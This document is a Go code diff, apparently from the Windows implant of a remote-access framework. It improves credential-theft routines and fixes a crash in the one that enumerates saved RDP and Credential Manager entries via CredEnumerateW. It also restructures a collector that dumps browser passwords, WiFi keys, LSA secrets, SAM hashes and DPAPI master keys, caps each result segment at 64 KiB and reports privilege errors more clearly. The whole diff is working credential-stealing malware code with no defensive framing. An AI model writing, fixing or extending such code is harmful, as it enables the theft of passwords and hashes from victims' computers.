@@ -13,6 +13,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -498,7 +499,7 @@ func dumpRDPCredentials() ([]map[string]string, error) {
 	var count uint32
 	var credsPtr uintptr
 
-	ret, _, _ := procCredEnumerateW.Call(
+	ret, _, callErr := procCredEnumerateW.Call(
 		0, // 不使用过滤器
 		0, // 枚举所有
 		uintptr(unsafe.Pointer(&count)),
@@ -506,17 +507,34 @@ func dumpRDPCredentials() ([]map[string]string, error) {
 	)
 
 	if ret == 0 {
-		return nil, fmt.Errorf("CredEnumerateW 失败")
+		// ERROR_NOT_FOUND = 目标机上没有已保存凭据：这是"0 条"，不是错误
+		// （旧实现把它当失败，界面会显示一条误导性的"RDP凭据收集失败"）。
+		if callErr == windows.ERROR_NOT_FOUND {
+			return []map[string]string{}, nil
+		}
+		return nil, fmt.Errorf("CredEnumerateW 失败: %v", callErr)
 	}
 
 	if credsPtr != 0 {
 		defer procCredFree.Call(credsPtr)
 	}
 
-	// 遍历凭据数组
+	// 遍历凭据数组。
+	//
+	// ⚠️ CredEnumerateW 返回的是 **PCREDENTIALW 数组**（即"指向结构体的指针"数组），
+	// 不是结构体数组。旧实现把"指针槽位的地址"直接当成 CREDENTIAL_W 用
+	// （credsPtr + i*sizeof(指针) 强转 *CREDENTIAL_W），读到的 TargetName/Blob 全是
+	// 垃圾指针 —— 一旦目标机上有任意一条已保存凭据，访问即触发 access violation，
+	// 整个植入进程崩溃（"凭据获取卡死其他任务"就是这个崩溃的直接后果）。
+	// 正确做法：先取出槽位里的指针，再解引用。
 	creds := make([]*CREDENTIAL_W, count)
+	ptrSize := unsafe.Sizeof(uintptr(0))
 	for i := uint32(0); i < count; i++ {
-		creds[i] = (*CREDENTIAL_W)(unsafe.Pointer(credsPtr + uintptr(i)*unsafe.Sizeof(&CREDENTIAL_W{})))
+		slot := (*uintptr)(unsafe.Pointer(credsPtr + uintptr(i)*ptrSize))
+		if slot == nil || *slot == 0 {
+			continue
+		}
+		creds[i] = (*CREDENTIAL_W)(unsafe.Pointer(*slot))
 	}
 
 	for _, cred := range creds {
@@ -838,178 +856,203 @@ func dumpDPAPIKeys() ([]map[string]string, error) {
 
 // ─── Entry Point ────────────────────────────────────────────────────────────────
 
+const (
+	// credentialsSegmentMaxBytes 单个凭据分段的字节上限（64 KiB）。
+	//
+	// 为什么分段 + 每段封顶：`all` 会把 browser/wifi/rdp/lsa/sam/dpapi 六类结果
+	// 拼成一个结果帧；任何一段（尤其 LSA 的 hex 密文）都可能几十上百 KB。
+	// 一个巨型结果帧会把植入端写循环与服务端读循环长时间占住（用户反馈的
+	// "凭据获取卡死其他任务"）。分段后每段独立封顶：超限只截该段并标
+	// truncated=true，其余段照常返回，界面也能逐段渲染。
+	credentialsSegmentMaxBytes = 64 << 10
+)
+
+// credentialsCollector 一类凭据的收集器（表驱动：all 与单 action 走同一条路径，
+// 避免"单 action 有上限、all 没有"这类两套逻辑漂移）。
+type credentialsCollector struct {
+	action string
+	label  string
+	// adminOnly 该类凭据通常需要管理员/SYSTEM：非管理员时必须给出明确的
+	// "需要管理员权限"文案，而不是一个空段/空串。
+	adminOnly bool
+	run       func() ([]map[string]string, error)
+}
+
+// credentialsCollectors 全部收集器（顺序即 all 的输出顺序）。
+func credentialsCollectors() []credentialsCollector {
+	return []credentialsCollector{
+		{action: "browser", label: "浏览器密码", run: dumpBrowserPasswords},
+		{action: "wifi", label: "WiFi 密码", run: dumpSavedWiFi},
+		{action: "rdp", label: "RDP / 凭据管理器", run: dumpRDPCredentials},
+		{action: "lsa", label: "LSA Secrets", adminOnly: true, run: dumpLSASecrets},
+		{action: "sam", label: "SAM 哈希", adminOnly: true, run: dumpSAM},
+		{action: "dpapi", label: "DPAPI 主密钥", run: dumpDPAPIKeys},
+	}
+}
+
+// credentialsErrorText 分段错误文案：管理员专属能力在非管理员下必须明确说
+// "需要管理员权限"，不能只回一个底层系统错误（更不是空串）。
+func credentialsErrorText(c credentialsCollector, elevated bool, err error) string {
+	if err == nil {
+		return ""
+	}
+	if c.adminOnly && !elevated {
+		return fmt.Sprintf("需要管理员权限：%s 需要以管理员（或 SYSTEM）权限运行，当前进程非管理员。底层错误：%v",
+			c.label, err)
+	}
+	return fmt.Sprintf("%s 收集失败：%v", c.label, err)
+}
+
+// capCredentialEntries 把条目列表压到"序列化后不超过 maxBytes"的最长前缀。
+//
+// 用二分查找而不是逐条 append+序列化：LSA 段可能有上百条 hex 密文，逐条重算
+// 是 O(n²)。返回保留的前缀与丢弃条数（omitted）。
+func capCredentialEntries(results []map[string]string, maxBytes int) ([]map[string]string, int) {
+	if len(results) == 0 || maxBytes <= 0 {
+		return results, 0
+	}
+	if b, err := json.Marshal(results); err == nil && len(b) <= maxBytes {
+		return results, 0
+	}
+	lo, hi := 0, len(results)
+	for lo < hi {
+		mid := (lo + hi + 1) / 2
+		if b, err := json.Marshal(results[:mid]); err == nil && len(b) <= maxBytes {
+			lo = mid
+		} else {
+			hi = mid - 1
+		}
+	}
+	return results[:lo], len(results) - lo
+}
+
+// credentialsSegment 构造"一类凭据"的结果段（纯函数，便于单测）。
+//
+// 字段（前端逐段渲染 / 每段条数与截断都在这里）：
+//
+//	action/label     段标识
+//	count            本次收集到的总条数（截断前）
+//	returned         实际返回的条数
+//	omitted          因段上限被丢弃的条数（>0 时 truncated=true）
+//	bytes            该段完整 data 的 JSON 字节数（截断前）
+//	truncated        是否因超过 64 KiB 被截断
+//	data             条目数组
+//	error            失败原因（管理员专属能力会带"需要管理员权限"）
+//	needs_admin      非管理员 + 管理员专属能力
+func credentialsSegment(c credentialsCollector, results []map[string]string, err error, elevated bool) map[string]interface{} {
+	seg := map[string]interface{}{
+		"action": c.action,
+		"label":  c.label,
+	}
+	if err != nil {
+		seg["count"] = 0
+		seg["returned"] = 0
+		seg["bytes"] = 0
+		seg["truncated"] = false
+		seg["error"] = credentialsErrorText(c, elevated, err)
+		if c.adminOnly && !elevated {
+			seg["needs_admin"] = true
+		}
+		return seg
+	}
+	if results == nil {
+		results = []map[string]string{}
+	}
+	full, _ := json.Marshal(results)
+	kept, omitted := capCredentialEntries(results, credentialsSegmentMaxBytes)
+	seg["count"] = len(results)
+	seg["returned"] = len(kept)
+	seg["bytes"] = len(full)
+	seg["truncated"] = omitted > 0
+	if omitted > 0 {
+		seg["omitted"] = omitted
+	}
+	seg["data"] = kept
+	return seg
+}
+
 // handleCredentials 凭据收集入口函数
-// action: "browser" | "wifi" | "rdp" | "lsa" | "all" (默认)
+// action: "browser" | "wifi" | "rdp" | "lsa" | "sam" | "dpapi" | "all" (默认)
+//
+// 返回体是**纯 JSON**（按 action 分段），不再在 JSON 后面追加提示文本 ——
+// 旧实现会把 "…[!] 提示…" 拼在 JSON 后面，前端 JSON.parse 直接失败，
+// 看起来就是"凭据没拿到/结果解析失败"。权限提示现在放在 notes 字段里。
 func handleCredentials(action string) (string, int32, string) {
-	var allResults map[string]interface{}
+	started := time.Now()
+	elevated := isElevated()
 
-	switch action {
-	case "browser":
-		results, err := dumpBrowserPasswords()
-		if err != nil {
-			return "", -1, fmt.Sprintf("浏览器凭据收集失败: %v", err)
-		}
-		allResults = map[string]interface{}{
-			"action": "browser",
-			"count":  len(results),
-			"data":   results,
-		}
-
-	case "wifi":
-		results, err := dumpSavedWiFi()
-		if err != nil {
-			return "", -1, fmt.Sprintf("WiFi密码收集失败: %v", err)
-		}
-		allResults = map[string]interface{}{
-			"action": "wifi",
-			"count":  len(results),
-			"data":   results,
-		}
-
-	case "rdp":
-		results, err := dumpRDPCredentials()
-		if err != nil {
-			return "", -1, fmt.Sprintf("RDP凭据收集失败: %v", err)
-		}
-		allResults = map[string]interface{}{
-			"action": "rdp",
-			"count":  len(results),
-			"data":   results,
-		}
-
-	case "lsa":
-		results, err := dumpLSASecrets()
-		if err != nil {
-			return "", -1, fmt.Sprintf("LSA Secrets收集失败: %v", err)
-		}
-		allResults = map[string]interface{}{
-			"action": "lsa",
-			"count":  len(results),
-			"data":   results,
-		}
-
-	case "sam":
-		results, err := dumpSAM()
-		if err != nil {
-			return "", -1, fmt.Sprintf("SAM收集失败: %v", err)
-		}
-		allResults = map[string]interface{}{
-			"action": "sam",
-			"count":  len(results),
-			"data":   results,
-		}
-
-	case "dpapi":
-		results, err := dumpDPAPIKeys()
-		if err != nil {
-			return "", -1, fmt.Sprintf("DPAPI密钥收集失败: %v", err)
-		}
-		allResults = map[string]interface{}{
-			"action": "dpapi",
-			"count":  len(results),
-			"data":   results,
-		}
-
-	case "all", "":
-		// 收集所有凭据类型
-		allResults = map[string]interface{}{
-			"action": "all",
-		}
-
-		// 浏览器凭据
-		browserResults, browserErr := dumpBrowserPasswords()
-		if browserErr == nil {
-			allResults["browser"] = map[string]interface{}{
-				"count": len(browserResults),
-				"data":  browserResults,
-			}
-		} else {
-			allResults["browser"] = map[string]interface{}{
-				"error": browserErr.Error(),
+	collectors := credentialsCollectors()
+	selected := collectors
+	if action != "" && action != "all" {
+		selected = nil
+		for _, c := range collectors {
+			if c.action == action {
+				selected = append(selected, c)
+				break
 			}
 		}
-
-		// WiFi 密码
-		wifiResults, wifiErr := dumpSavedWiFi()
-		if wifiErr == nil {
-			allResults["wifi"] = map[string]interface{}{
-				"count": len(wifiResults),
-				"data":  wifiResults,
-			}
-		} else {
-			allResults["wifi"] = map[string]interface{}{
-				"error": wifiErr.Error(),
-			}
+		if len(selected) == 0 {
+			return "", -1, fmt.Sprintf("未知的凭据收集操作: %s (支持: all, browser, wifi, rdp, lsa, sam, dpapi)", action)
 		}
-
-		// RDP 凭据
-		rdpResults, rdpErr := dumpRDPCredentials()
-		if rdpErr == nil {
-			allResults["rdp"] = map[string]interface{}{
-				"count": len(rdpResults),
-				"data":  rdpResults,
-			}
-		} else {
-			allResults["rdp"] = map[string]interface{}{
-				"error": rdpErr.Error(),
-			}
-		}
-
-		// LSA Secrets
-		lsaResults, lsaErr := dumpLSASecrets()
-		if lsaErr == nil {
-			allResults["lsa"] = map[string]interface{}{
-				"count": len(lsaResults),
-				"data":  lsaResults,
-			}
-		} else {
-			allResults["lsa"] = map[string]interface{}{
-				"error": lsaErr.Error(),
-			}
-		}
-
-		// SAM 哈希（需要 SYSTEM 权限）
-		samResults, samErr := dumpSAM()
-		if samErr == nil {
-			allResults["sam"] = map[string]interface{}{
-				"count": len(samResults),
-				"data":  samResults,
-			}
-		} else {
-			allResults["sam"] = map[string]interface{}{
-				"error": samErr.Error(),
-			}
-		}
-
-		// DPAPI 主密钥
-		dpapiResults, dpapiErr := dumpDPAPIKeys()
-		if dpapiErr == nil {
-			allResults["dpapi"] = map[string]interface{}{
-				"count": len(dpapiResults),
-				"data":  dpapiResults,
-			}
-		} else {
-			allResults["dpapi"] = map[string]interface{}{
-				"error": dpapiErr.Error(),
-			}
-		}
-
-	default:
-		return "", -1, fmt.Sprintf("未知的凭据收集操作: %s (支持: all, browser, wifi, rdp, lsa, sam, dpapi)", action)
+	} else {
+		action = "all"
 	}
 
-	jsonData, err := json.MarshalIndent(allResults, "", "  ")
+	out := map[string]interface{}{
+		"action":   action,
+		"elevated": elevated,
+	}
+	total, returned := 0, 0
+	anyTruncated := false
+	var notes []string
+	firstErr := ""
+
+	for _, c := range selected {
+		results, err := c.run()
+		seg := credentialsSegment(c, results, err, elevated)
+		out[c.action] = seg
+		if n, ok := seg["count"].(int); ok {
+			total += n
+		}
+		if n, ok := seg["returned"].(int); ok {
+			returned += n
+		}
+		if t, ok := seg["truncated"].(bool); ok && t {
+			anyTruncated = true
+		}
+		if msg, ok := seg["error"].(string); ok && msg != "" && firstErr == "" {
+			firstErr = msg
+		}
+	}
+
+	out["total_count"] = total
+	out["returned_count"] = returned
+	out["truncated"] = anyTruncated
+	out["duration_ms"] = time.Since(started).Milliseconds()
+	if !elevated {
+		notes = append(notes,
+			"当前以非管理员权限运行：LSA Secrets / SAM 需要管理员或 SYSTEM 权限，相关段会给出明确错误而不是空结果。")
+	}
+	if anyTruncated {
+		notes = append(notes, fmt.Sprintf(
+			"有分段超过 %d 字节上限被截断（truncated=true，omitted 为丢弃条数）；其余分段不受影响。",
+			credentialsSegmentMaxBytes))
+	}
+	if len(notes) > 0 {
+		out["notes"] = notes
+	}
+
+	jsonData, err := json.MarshalIndent(out, "", "  ")
 	if err != nil {
 		return "", -1, fmt.Sprintf("JSON序列化失败: %v", err)
 	}
 
-	// 权限提示
-	privNote := ""
-	if !isElevated() {
-		privNote = "\n[!] 提示: 当前非管理员权限，LSA Secrets 可能无法完全读取。"
+	// 单 action 且该类收集失败：明确返回失败（output 仍带分段 JSON，界面能展示
+	// 服务端原文错误），而不是"成功但空字符串"。
+	if action != "all" && firstErr != "" {
+		return string(jsonData), -1, firstErr
 	}
-
-	return string(jsonData) + privNote, 0, ""
+	return string(jsonData), 0, ""
 }
 
 // isElevated 检查是否以管理员权限运行
